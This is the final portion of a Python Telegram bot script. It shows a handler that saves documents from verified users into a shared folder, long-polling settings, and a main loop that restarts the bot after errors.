            send(chat_id, f'{type(error).__name__}({error})')


    @tg.message_handler(content_types=['document'])
    def upload(file): 
        chat_id = file.chat.id 
        user_id = file.from_user.id 
        doc_id = file.document.file_id
        doc_name = file.document.file_name

        if not verify_user(chat_id, user_id, '', '', ''):
            return

        try:
            write_file(os.path.join(PATH_SHARE, doc_name), tg.download_file(tg.get_file(doc_id).file_path))
        except:
            send(chat_id, f'failed to upload file {doc_name}) [-]')
        else:
            send(chat_id, f'file is uploaded ({doc_name}) [+]')


    tg.infinity_polling(
        skip_pending=True,
        allowed_updates=['message'],
        timeout=30, 
        long_polling_timeout=30
    )
    

def main():
    init()

    while True:
        try:
            bot()
        except SystemExit as er:
            arg = er.args

            if 'TOKEN' in arg:
                raise ValueError(arg[1])
        except:
            sleep(10)




if __name__ == '__main__': main()
